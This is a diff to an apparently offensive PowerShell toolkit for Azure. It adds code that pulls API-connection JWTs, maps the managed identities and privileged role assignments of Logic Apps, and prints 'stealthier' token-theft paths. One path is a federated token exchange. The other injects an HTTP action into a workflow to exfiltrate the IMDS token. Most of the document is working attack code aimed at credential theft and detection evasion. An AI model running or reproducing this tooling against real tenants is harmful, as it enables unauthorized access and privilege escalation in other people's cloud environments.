@@ -1,3 +1,235 @@
+function Resolve-MiConnectionChain {
+    # Internal helper — not exported.
+    # Walks: MI connection → Logic Apps → identity type →
+    #        role assignments → recommended token path.
+    param (
+        [string]$ConnectionId,
+        [string]$ConnectionName,
+        [object]$Sv,
+        [hashtable]$Auth
+    )
+
+    $connIdLower = $ConnectionId.ToLower()
+    $sub         = ($ConnectionId -split '/')[2]
+    $report      = [System.Collections.ArrayList]::new()
+
+    # ── 1. Find Logic Apps referencing this connection ──────────────
+    $laUri = (
+        '{0}/subscriptions/{1}/providers/Microsoft.Logic' +
+        '/workflows?api-version=2019-05-01'
+    ) -f $Sv.armUri, $sub
+
+    try {
+        $allLas = (Invoke-RestMethod `
+            -Uri       $laUri `
+            -Headers   $Auth `
+            -Method    'GET' `
+            -UserAgent $Sv.userAgent).value
+    }
+    catch {
+        Write-Verbose "Could not list Logic Apps: $($_.Exception.Message)"
+        $allLas = @()
+    }
+
+    $linkedLas = @()
+    foreach ($la in $allLas) {
+        $refs = $la.properties.parameters.`
+            '$connections'.value
+        if (-not $refs) { continue }
+        foreach ($key in $refs.PSObject.Properties.Name) {
+            if ($refs.$key.connectionId.ToLower() -eq $connIdLower) {
+                $linkedLas += $la
+                break
+            }
+        }
+    }
+
+    if ($linkedLas.Count -eq 0) {
+        Write-Host (
+            '      No Logic Apps reference this connection ' +
+            '(orphaned MI connection)'
+        ) -ForegroundColor DarkYellow
+        return $null
+    }
+
+    Write-Host (
+        "      Found $($linkedLas.Count) consuming " +
+        'Logic App(s)'
+    ) -ForegroundColor Cyan
+
+    # ── 2. For each Logic App — extract identity + roles ────────────
+    foreach ($la in $linkedLas) {
+        $laName = $la.name
+        $laId   = $la.id
+        $laRg   = ($laId -split '/')[4]
+        $laIdentity = $la.identity
+
+        Write-Host "      [$laName]" -ForegroundColor White
+
+        $miType      = $null
+        $miPrincipal = $null
+        $uamiIds     = @()
+
+        if (-not $laIdentity) {
+            Write-Host (
+                '        No managed identity assigned'
+            ) -ForegroundColor DarkGray
+            continue
+        }
+
+        $miType = $laIdentity.type  # SystemAssigned | UserAssigned | both
+
+        if ($miType -match 'SystemAssigned') {
+            $miPrincipal = $laIdentity.principalId
+            Write-Host (
+                "        Identity : SystemAssigned" +
+                " (principalId: $miPrincipal)"
+            ) -ForegroundColor Cyan
+        }
+
+        if ($miType -match 'UserAssigned') {
+            $uamiIds = $laIdentity.userAssignedIdentities.`
+                PSObject.Properties.Name
+            foreach ($uamiId in $uamiIds) {
+                $clientId = $laIdentity.userAssignedIdentities.`
+                    $uamiId.clientId
+                Write-Host (
+                    "        Identity : UserAssigned" +
+                    " — $($uamiId.Split('/')[-1])" +
+                    " (clientId: $clientId)"
+                ) -ForegroundColor Cyan
+            }
+        }
+
+        # ── 3. Role assignments for each identity ───────────────────
+        $principalIds = @()
+        if ($miPrincipal) { $principalIds += $miPrincipal }
+        foreach ($uamiId in $uamiIds) {
+            $cid = $laIdentity.userAssignedIdentities.`
+                $uamiId.principalId
+            if ($cid) { $principalIds += $cid }
+        }
+
+        $roles = @()
+        foreach ($pid in $principalIds) {
+            $roleUri = (
+                '{0}/subscriptions/{1}/providers/' +
+                'Microsoft.Authorization/roleAssignments' +
+                '?api-version=2022-04-01' +
+                '&$filter=principalId eq ''{2}'''
+            ) -f $Sv.armUri, $sub, $pid
+
+            try {
+                $assignments = (Invoke-RestMethod `
+                    -Uri       $roleUri `
+                    -Headers   $Auth `
+                    -Method    'GET' `
+                    -UserAgent $Sv.userAgent).value
+
+                foreach ($ra in $assignments) {
+                    $roleParts = $ra.properties.roleDefinitionId `
+                        -split '/'
+                    $roleDefId = $roleParts[-1]
+
+                    # Resolve role name
+                    $roleNameUri = (
+                        '{0}/subscriptions/{1}/providers/' +
+                        'Microsoft.Authorization/roleDefinitions/{2}' +
+                        '?api-version=2022-04-01'
+                    ) -f $Sv.armUri, $sub, $roleDefId
+
+                    $roleName = try {
+                        (Invoke-RestMethod `
+                            -Uri       $roleNameUri `
+                            -Headers   $Auth `
+                            -Method    'GET' `
+                            -UserAgent $Sv.userAgent).properties.roleName
+                    }
+                    catch { $roleDefId }
+
+                    $scope = $ra.properties.scope
+                    $roles += "$roleName @ $scope"
+                    Write-Host (
+                        "        Role : $roleName" +
+                        " → $scope"
+                    ) -ForegroundColor $(
+                        if ($roleName -match 'Owner|Contributor|Admin') {
+                            'Red'
+                        } else { 'Yellow' }
+                    )
+                }
+            }
+            catch {
+                Write-Verbose (
+                    "Could not enumerate roles for " +
+                    "$pid`: $($_.Exception.Message)"
+                )
+            }
+        }
+
+        # ── 4. Recommended token path  ───────────────────────────────
+        Write-Host '        Token path recommendation:' `
+            -ForegroundColor Magenta
+
+        if ($miType -match 'UserAssigned' -and $uamiIds.Count -gt 0) {
+            $uamiId = $uamiIds[0]
+            Write-Host (
+                '          [UAMI] Use Invoke-FederatedTokenExchange' +
+                ' (stealthier — no compute, no artifacts):'
+            ) -ForegroundColor Green
+            Write-Host (
+                "          Invoke-FederatedTokenExchange" +
+                " -Id '$uamiId'" +
+                " -IssuerUrl 'https://<your-oidc-issuer>'" +
+                " -EndpointType Azure -Cleanup"
+            ) -ForegroundColor White
+            Write-Host (
+                '          Requires: federatedIdentityCredentials' +
+                '/write on the UAMI'
+            ) -ForegroundColor DarkGray
+            Write-Host (
+                '          Alt (noisier): Get-ManagedIdentityToken' +
+                " -Id '$uamiId'" +
+                " -ResourceGroupName '$laRg'"
+            ) -ForegroundColor DarkGray
+        }
+        elseif ($miType -match 'SystemAssigned' -and $miPrincipal) {
+            Write-Host (
+                '          [SAI] System-assigned MI — token only' +
+                ' obtainable from within the Logic App runtime'
+            ) -ForegroundColor Yellow
+            Write-Host (
+                '          Attack path: inject HTTP action into' +
+                ' workflow definition to exfiltrate IMDS token:'
+            ) -ForegroundColor Yellow
+            $laRgEnc = [Uri]::EscapeDataString($laRg)
+            Write-Host (
+                "          GET $($Sv.armUri)/subscriptions/$sub/" +
+                "resourceGroups/$laRg/providers/Microsoft.Logic/" +
+                "workflows/$laName" +
+                '?api-version=2019-05-01 → modify definition'
+            ) -ForegroundColor White
+            Write-Host (
+                "          IMDS endpoint (from inside workflow):" +
+                ' http://169.254.169.254/metadata/identity/' +
+                'oauth2/token?api-version=2018-02-01' +
+                '&resource=https://management.azure.com/'
+            ) -ForegroundColor DarkGray
+        }
+
+        $report.Add([PSCustomObject]@{
+            LogicAppName = $laName
+            LogicAppId   = $laId
+            IdentityType = $miType
+            PrincipalIds = $principalIds -join '; '
+            UAMIIds      = $uamiIds -join '; '
+            RoleAssignments = $roles -join ' | '
+        }) | Out-Null
+    }
+
+    return $report
+}
+
 function Get-ApiConnectionToken {
     [CmdletBinding()]
     param (
@@ -26,6 +258,13 @@ function Get-ApiConnectionToken {
         [Alias('validity-days')]
         [int]$ValidityDays = 1,
 
+        # When set on an MI-type connection, enumerates the consuming
+        # Logic App's identity, its role assignments, and recommends
+        # the least-noisy token path (FIC for UAMI, injection for SAI)
+        [Parameter(Mandatory = $false)]
+        [Alias('resolve-mi')]
+        [switch]$ResolveManagedIdentity,
+
         [Parameter(Mandatory = $false)]
         [ValidateSet('Object', 'JSON', 'CSV', 'Table')]
         [Alias('output', 'o')]
@@ -41,6 +280,7 @@ function Get-ApiConnectionToken {
             StartTime    = Get-Date
             Attempted    = 0
             Succeeded    = 0
+            SkippedMI    = 0
             Failed       = 0
             Unauthorized = 0
         }
@@ -117,6 +357,52 @@ function Get-ApiConnectionToken {
                     $authorizedAs    = $props.authenticatedUser.name
                     $connectionName  = $conn.name
 
+                    # Managed Identity connections (parameterValueType
+                    # 'Alternative') have no static keys — they obtain
+                    # ARM tokens at runtime via the Logic App's MI.
+                    # listConnectionKeys is not supported for these.
+                    if ($props.parameterValueType -eq 'Alternative') {
+                        Write-Host (
+                            "  [~] $connectionName ($connectorId)" +
+                            ' — Managed Identity connection'
+                        ) -ForegroundColor Yellow
+
+                        $miAnalysis = $null
+
+                        if ($ResolveManagedIdentity) {
+                            Write-Host (
+                                '      Resolving consuming Logic Apps' +
+                                ' and MI identity chain...'
+                            ) -ForegroundColor Cyan
+
+                            $miAnalysis = Resolve-MiConnectionChain `
+                                -ConnectionId $connId `
+                                -ConnectionName $connectionName `
+                                -Sv $script:SessionVariables `
+                                -Auth $script:authHeader
+                        }
+
+                        [void]$result.Add([PSCustomObject]@{
+                            'ConnectionName'   = $connectionName
+                            'ConnectorId'      = $connectorId
+                            'ConnectorDisplay' = $connectorName
+                            'AuthorizedAs'     = 'ManagedIdentity'
+                            'ConnectionStatus' = (
+                                $props.statuses |
+                                Select-Object -First 1 `
+                                    -ExpandProperty status
+                            )
+                            'RuntimeUrl'       = $runtimeUrl
+                            'Token'            = $null
+                            'NotAfter'         = $null
+                            'MIAnalysis'       = $miAnalysis
+                            'ResourceId'       = $connId
+                            'ResourceGroup'    = ($connId -split '/')[4]
+                        })
+                        $stats.SkippedMI++
+                        continue
+                    }
+
                     # Step 2: POST listConnectionKeys to retrieve
                     # a short-lived JWT for the connection runtime.
                     #
@@ -159,7 +445,8 @@ function Get-ApiConnectionToken {
                             ' — retrying with stable API'
                         )
 
-                        # Attempt 2 — stable API, empty body
+                        # Attempt 2 — stable API, same body
+                        # (2016-06-01 also requires validityTimeSpan)
                         $keysUri2 = (
                             '{0}{1}/listConnectionKeys' +
                             '?api-version=2016-06-01'
@@ -169,7 +456,7 @@ function Get-ApiConnectionToken {
                             -Uri         $keysUri2 `
                             -Headers     $auth `
                             -Method      'POST' `
-                            -Body        '{}' `
+                            -Body        $body `
                             -ContentType 'application/json' `
                             -UserAgent   $sv.userAgent
                     }
@@ -289,6 +576,8 @@ function Get-ApiConnectionToken {
             -ForegroundColor Red
         Write-Host "   Errors       : $($stats.Failed)" `
             -ForegroundColor Red
+        Write-Host "   Skipped (MI) : $($stats.SkippedMI)" `
+            -ForegroundColor Yellow
         Write-Host (
             "   Duration     : " +
             "$($duration.TotalSeconds.ToString('F2'))s"
@@ -343,6 +632,20 @@ function Get-ApiConnectionToken {
     .PARAMETER ValidityDays
         Token validity period in days (1–7). Default is 1.
 
+    .PARAMETER ResolveManagedIdentity
+        When set, performs deep analysis on MI-type connections:
+        finds the Logic App(s) consuming the connection, resolves the
+        Logic App identity (system-assigned vs user-assigned), enumerates
+        all role assignments of that identity, and prints the recommended
+        least-noisy token path:
+
+        - UserAssigned MI → Invoke-FederatedTokenExchange
+          (stealthier: no ACI, no deployment script,
+           requires federatedIdentityCredentials/write on the UAMI)
+        - SystemAssigned MI → workflow injection path
+          (inject HTTP action into the LA definition to exfiltrate
+           the IMDS token from within the runtime context)
+
     .PARAMETER OutputFormat
         Output format: Object (default), JSON, CSV, Table.
 
@@ -369,6 +672,15 @@ function Get-ApiConnectionToken {
 
         Chains Get-ApiConnection discovery into token retrieval, then
         uses the token to call the connection runtime directly.
+
+    .EXAMPLE
+        Get-ApiConnectionToken -ConnectionId '/subscriptions/.../' `
+            -ResolveManagedIdentity
+
+        For an MI-type connection: resolves the consuming Logic App,
+        extracts its identity type and role assignments, and prints
+        the recommended token path (FIC exchange for UAMI, or
+        workflow injection guidance for system-assigned MI).
 
     .EXAMPLE
         Get-ApiConnectionToken -OutputFormat JSON
